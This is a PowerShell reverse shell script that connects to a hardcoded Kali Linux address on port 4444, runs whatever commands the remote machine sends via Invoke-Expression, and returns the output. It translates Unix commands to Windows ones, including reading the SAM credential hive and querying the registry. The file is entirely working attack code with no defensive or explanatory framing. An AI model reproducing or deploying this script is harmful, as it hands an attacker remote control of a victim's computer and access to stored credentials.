# Replace with the IP address of your Kali Linux machine
$remoteIP = "192.168.72.129"
$remotePort = 4444

# Try establishing a TCP connection
try {
    $socket = New-Object System.Net.Sockets.TcpClient($remoteIP, $remotePort)
    if (-not $socket.Connected) {
        Write-Output "Failed to connect to the server. Exiting..."
        exit 1
    }
} catch {
    Write-Output "Error: Unable to establish a connection. $_"
    exit 1
}

# Get the network stream and set up for communication
$stream = $socket.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)
$encoding = New-Object System.Text.AsciiEncoding

Write-Output "Connected to ${remoteIP}:${remotePort}"

do {
    try {
        # Read a command from the server
        $command = $reader.ReadLine()
        if ($command -eq $null) { continue }

        # Exit condition
        if ($command -eq "exit") {
            Write-Output "Exiting..."
            break
        }

        # Translate Unix/Linux commands to Windows equivalents if necessary
        switch -Wildcard ($command) {
            # File and Directory Management
            "ls" { $command = "dir" }
            "pwd" { $command = "cd" }
            "cat hosts" { $command = "type C:\Windows\System32\drivers\etc\hosts" }
            "rm *" { $command = "del *" }
            "cp *" { $command = "copy *" }
            "mv *" { $command = "move *" }

            # System Information
            "uname -a" { $command = "systeminfo" }
            "whoami" { $command = "whoami" }
            "id" { $command = "whoami /all" }
            "df" { $command = "wmic logicaldisk get size,freespace,caption" }
            "top" { $command = "tasklist" }
            "ps" { $command = "tasklist" }
            "uptime" { $command = 'systeminfo | findstr /C:"System Boot Time"' }

            # Network Information
            "ifconfig" { $command = "ipconfig /all" }
            "netstat" { $command = "netstat -ano" }
            "ping *" { $command = "ping $($command -replace 'ping ','')" }
            "traceroute *" { $command = "tracert $($command -replace 'traceroute ','')" }
            "arp -a" { $command = "arp -a" }

            # Critical Files and Directories
            "cat passwd" { $command = "type C:\Windows\System32\drivers\etc\hosts" }
            "cat shadow" { $command = "type C:\Windows\System32\config\SAM" }
            "registry" { $command = "reg query HKLM" }

            # Miscellaneous
            "history" { $output = "Command history is not available in Windows." }

            default { }
        }

        # Execute the command and capture the output
        $output = Invoke-Expression -Command $command 2>&1 | Out-String
    } catch {
        $output = "Error executing command: $_"
    }

    # Send the output back to the server
    $writer.WriteLine($output)
    $writer.Flush()

} while ($true)

# Clean up resources
$writer.Close()
$reader.Close()
$stream.Close()
$socket.Close()

Write-Output "Connection closed."
